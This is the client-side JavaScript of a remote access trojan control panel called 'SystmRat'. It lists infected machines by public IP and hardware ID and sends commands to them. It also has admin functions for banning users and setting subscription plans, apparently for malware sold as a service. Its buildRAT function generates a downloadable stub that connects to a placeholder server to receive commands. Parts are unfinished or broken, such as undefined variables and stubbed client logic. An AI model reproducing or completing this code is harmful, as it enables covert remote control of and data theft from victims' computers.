let currentUserId = null;

function login() {
    const username = document.getElementById('login-username').value;
    const password = document.getElementById('login-password').value;
    fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    }).then(res => res.json()).then(data => {
        if (data.success) {
            currentUserId = data.userId;
            document.getElementById('login-panel').style.display = 'none';
            document.getElementById('dashboard').style.display = 'flex';
            loadDashboard();
        }
    });
}

function register() {
    const username = document.getElementById('login-username').value;
    const password = document.getElementById('login-password').value;
    fetch('/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password, isAdmin: false })
    }).then(res => res.json()).then(data => {
        if (data.success) alert('Registered successfully');
    });
}

function loadDashboard() {
    fetch(`/clients/${currentUserId}`, {
        headers: { 'x-user-id': currentUserId }
    }).then(res => res.json()).then(clients => {
        const clientEntries = document.getElementById('client-entries');
        clientEntries.innerHTML = '';
        clients.forEach(client => {
            const entry = document.createElement('div');
            entry.className = 'client-entry';
            entry.innerHTML = `
                <span>${client.username}</span>
                <span>${client.publicIP || 'N/A'}</span>
                <span>${client.hwid || 'N/A'}</span>
                <span class="${client.status === 'Broken' ? 'status-offline' : 'status-online'}">${client.status}</span>
                <span><button onclick="viewClient('${client.id}')">→</button></span>
            `;
            clientEntries.appendChild(entry);
        });
    });
}

function sendCommand() {
    const message = document.getElementById('chat-input').value;
    const [command, ...args] = message.split(' ');
    fetch(`/command/${currentUserId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-user-id': currentUserId },
        body: JSON.stringify({ id: userClients[currentUserId][0]?.id, command, args })
    }).then(() => {
        addChatMessage(`You: ${message}`);
        document.getElementById('chat-input').value = '';
    });
}

function addChatMessage(message) {
    const chatMessages = document.getElementById('chat-messages');
    const msgDiv = document.createElement('div');
    msgDiv.textContent = message;
    chatMessages.appendChild(msgDiv);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

function viewClient(clientId) {
    // Implement client view logic
}

function banUser() {
    const user = document.getElementById('user-list').value;
    fetch('/admin/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-user-id': currentUserId },
        body: JSON.stringify({ action: 'ban', targetUser: user })
    }).then(() => loadUserList());
}

function unbanUser() {
    const user = document.getElementById('user-list').value;
    fetch('/admin/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-user-id': currentUserId },
        body: JSON.stringify({ action: 'unban', targetUser: user })
    }).then(() => loadUserList());
}

function suspendUser() {
    const user = document.getElementById('user-list').value;
    const days = document.getElementById('suspend-days').value;
    fetch('/admin/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-user-id': currentUserId },
        body: JSON.stringify({ action: 'suspend', targetUser: user, days })
    }).then(() => loadUserList());
}

function setPlan() {
    const user = document.getElementById('user-list').value;
    const planExpires = document.getElementById('plan-expires').value;
    fetch('/admin/action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-user-id': currentUserId },
        body: JSON.stringify({ action: 'setPlan', targetUser: user, planExpires })
    }).then(() => loadUserList());
}

function loadUserList() {
    const userList = document.getElementById('user-list');
    userList.innerHTML = '';
    Object.keys(users).forEach(user => {
        const option = document.createElement('option');
        option.value = user;
        option.textContent = user;
        userList.appendChild(option);
    });
    document.getElementById('admin-panel').style.display = users[currentUserId]?.isAdmin ? 'block' : 'none';
}

function buildRAT() {
    const userId = document.getElementById('build-user-id').value;
    if (users[userId] && !users[userId].suspended) {
        const ratScript = `
            const ws = new WebSocket('ws://your-server:3000', { headers: { 'x-user-id': '${userId}' } });
            ws.onopen = () => { ws.send(JSON.stringify({ id: 'initial' })); };
            ws.onmessage = (event) => { const data = JSON.parse(event.data); if (data.id) { /* Client logic */ } };
        `;
        const blob = new Blob([ratScript], { type: 'text/javascript' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `SystmRat_${userId}.js`;
        link.click();
        URL.revokeObjectURL(url);
    }
}

function changePassword() {
    const oldPassword = prompt('Old Password');
    const newPassword = prompt('New Password');
    fetch('/change-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-user-id': currentUserId },
        body: JSON.stringify({ userId: currentUserId, oldPassword, newPassword })
    }).then(res => res.json()).then(data => alert(data.success ? 'Password changed' : 'Failed'));
}

if (users[currentUserId]?.isAdmin) loadUserList();
setInterval(loadDashboard, 2000);
